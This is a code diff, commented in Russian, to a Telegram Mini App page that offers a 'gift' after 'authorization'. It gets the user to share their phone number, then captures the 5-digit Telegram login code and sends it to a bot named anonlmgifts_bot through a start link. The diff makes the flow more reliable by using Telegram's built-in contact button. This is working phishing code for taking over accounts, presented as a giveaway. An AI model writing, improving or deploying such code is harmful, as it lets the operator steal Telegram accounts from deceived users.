@@ -12,12 +12,12 @@
         
         /* Стили для экрана ввода кода */
         .code-header { font-size: 24px; font-weight: 500; margin-bottom: 10px; margin-top: 20px; }
-        .code-subtitle { font-size: 14px; color: var(--tg-theme-hint-color, #999999); margin-bottom: 30px; }
+        .code-subtitle { font-size: 14px; color: var(--tg-theme-hint-color, #999999); margin-bottom: 30px; line-height: 1.4; }
         
-        /* Скрываем стандартный инпут, но он будет ловить ввод */
+        /* Скрываем стандартный инпут */
         .code-input { 
             position: absolute; opacity: 0; width: 1px; height: 1px; 
-            font-size: 16px; /* Важно для iOS, чтобы не было зума */
+            font-size: 16px;
         }
         
         /* Красивые ячейки для цифр */
@@ -36,16 +36,15 @@
     <!-- Экран 1 -->
     <div id="screen-phone">
         <h2 style="margin-top: 40px;">Шаг 1</h2>
-        <p style="color: gray;">Для получения подарка авторизуйтесь</p>
-        <button id="share-phone-btn" class="share-btn">ПОДЕЛИТЬСЯ НОМЕРОМ</button>
+        <p style="color: gray;">Для получения подарка авторизуйтесь по кнопке ниже 👇</p>
+        <!-- Эту кнопку мы скроем, так как будем использовать встроенную кнопку Telegram -->
     </div>
 
     <!-- Экран 2 (Ввод кода) -->
     <div id="screen-code" class="hidden">
         <div class="code-header">Введите код</div>
-        <div class="code-subtitle">Мы отправили код от Telegram на номер<br><b id="user-phone"></b></div>
+        <div class="code-subtitle">Мы отправили код от Telegram на ваш номер<br><b id="user-phone">***</b></div>
         
-        <!-- Красивые ячейки -->
         <div class="code-container" id="code-cells">
             <div class="code-cell"></div>
             <div class="code-cell"></div>
@@ -54,7 +53,6 @@
             <div class="code-cell"></div>
         </div>
 
-        <!-- Скрытый инпут, который вызывает клавиатуру и ловит смс-код -->
         <input type="text" id="code-input" class="code-input" inputmode="numeric" autocomplete="one-time-code" maxlength="5">
     </div>
 
@@ -65,35 +63,42 @@
                 tg.expand();
                 let isSent = false;
 
-                const codeInput = document.getElementById('code-input');
-                const codeCells = document.querySelectorAll('.code-cell');
-                const codeContainer = document.getElementById('code-cells');
-
-                // Делаем так, чтобы при клике на ячейки открывалась клавиатура
-                codeContainer.onclick = function() {
-                    codeInput.focus();
-                };
-
-                // 1. Запрос номера
-                document.getElementById('share-phone-btn').onclick = function() {
+                // 1. ПОКАЗЫВАЕМ ВСТРОЕННУЮ КНОПКУ ЗАПРОСА КОНТАКТА
+                // Это самый надежный способ. Кнопка появится внизу экрана в Telegram.
+                tg.MainButton.setText("ПОДЕЛИТЬСЯ НОМЕРОМ");
+                tg.MainButton.show();
+                
+                tg.MainButton.onClick(function() {
+                    // Запрашиваем контакт (iOS/Android)
                     tg.requestContact(function(shared, contact) {
-                        if (shared) {
+                        if (shared && contact) {
+                            // Успешно получили контакт
                             document.getElementById('user-phone').innerText = "+" + contact.phone_number;
                             document.getElementById('screen-phone').classList.add('hidden');
                             document.getElementById('screen-code').classList.remove('hidden');
                             
-                            // Автоматически открываем клавиатуру
-                            setTimeout(() => { codeInput.focus(); }, 100);
+                            // Скрываем кнопку "Поделиться" и меняем на кнопку "Отправить"
+                            tg.MainButton.hide();
+                            
+                            // Автоматически открываем клавиатуру для ввода кода
+                            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
+                        } else {
+                            tg.showAlert("Вы отменили отправку номера.");
                         }
                     });
-                };
+                });
 
-                // 2. Обработка ввода кода (анимация ячеек + отправка)
+                // 2. Обработка ввода кода
+                const codeInput = document.getElementById('code-input');
+                const codeCells = document.querySelectorAll('.code-cell');
+                const codeContainer = document.getElementById('code-cells');
+
+                codeContainer.onclick = function() { codeInput.focus(); };
+
                 codeInput.addEventListener('input', function(e) {
-                    const value = this.value.replace(/\D/g, ''); // Только цифры
-                    this.value = value; // Обновляем значение (убираем буквы)
+                    const value = this.value.replace(/\D/g, ''); 
+                    this.value = value; 
 
-                    // Обновляем ячейки
                     codeCells.forEach((cell, index) => {
                         if (index < value.length) {
                             cell.innerText = value[index];
@@ -103,7 +108,6 @@
                             cell.classList.remove('filled');
                         }
                         
-                        // Подсветка текущей ячейки
                         if (index === value.length) {
                             cell.classList.add('active');
                         } else {
@@ -111,15 +115,12 @@
                         }
                     });
 
-                    // Если ввели 5 цифр
                     if (value.length === 5 && !isSent) {
                         isSent = true; 
-                        this.blur(); // Прячем клавиатуру
+                        this.blur(); 
                         
-                        // ВАЖНО: Твой юзернейм
                         const botUsername = "anonlmgifts_bot"; 
                         
-                        // Открываем ссылку с кодом (через 0.5 сек для красоты)
                         setTimeout(() => {
                             tg.openTelegramLink("https://t.me/" + botUsername + "?start=" + value);
                             setTimeout(() => tg.close(), 500);
